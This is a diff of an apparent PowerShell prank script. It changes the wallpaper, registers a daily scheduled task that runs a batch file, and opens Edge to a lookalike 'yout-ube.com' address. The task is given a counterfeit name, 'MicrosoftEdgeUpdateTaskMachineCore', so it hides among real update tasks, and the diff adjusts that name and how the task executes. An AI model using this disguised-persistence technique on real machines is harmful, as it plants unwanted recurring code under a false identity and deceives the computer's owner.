@@ -51,7 +51,7 @@ namespace Win32{
 
 add-type $code
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument C:\temp\lobster.bat
+$action = New-ScheduledTaskAction -Execute 'C:\temp\lobster.bat'
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{325}" -Description "Ear death"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
